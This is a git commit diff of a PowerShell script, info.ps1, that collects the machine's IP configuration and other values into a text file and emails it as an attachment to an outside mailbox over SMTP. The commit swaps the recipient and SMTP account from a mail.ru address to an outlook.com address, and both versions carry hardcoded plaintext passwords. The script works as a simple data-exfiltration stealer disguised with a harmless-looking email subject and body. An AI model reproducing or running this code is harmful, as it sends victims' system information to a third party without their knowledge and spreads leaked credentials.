01184397db11cae63ccf3a44612d61cea54705ba
louist12 <114141279+louist12@users.noreply.github.com>
2022-09-26 01:06:26 -0700

    Update info.ps1

--- info.ps1
+++ info.ps1
@@ -3,15 +3,15 @@ $ip = Get-NetIPConfiguration
 $value, $ip | Out-File -FilePath C:\Users\$env:UserName\Downloads\test.txt
 
 $attachment = "C:\Users\user\Downloads\test.txt"
-$EmailTo = "louist@internet.ru"
-$EmailFrom = "louist@internet.ru"
+$EmailTo = "myansen039@outlook.com"
+$EmailFrom = "myansen039@outlook.com"
 $Subject = "hello there!!" 
 $Body = "how are you??"
-$smtpServer = "smtp.mail.ru" 
+$smtpServer = "smtp.outlook.com" 
 $smtpMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
 $attach = new-object Net.Mail.Attachment($attachment)
 $smtpMessage.Attachments.Add($attach)
 $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
 $SMTPClient.EnableSsl = $true 
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("louist@internet.ru", "DAXR9gkh5ukkzPPmpDuR"); 
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("myansen039@outlook.com", "Root@roxx1"); 
 $SMTPClient.Send($smtpMessage)
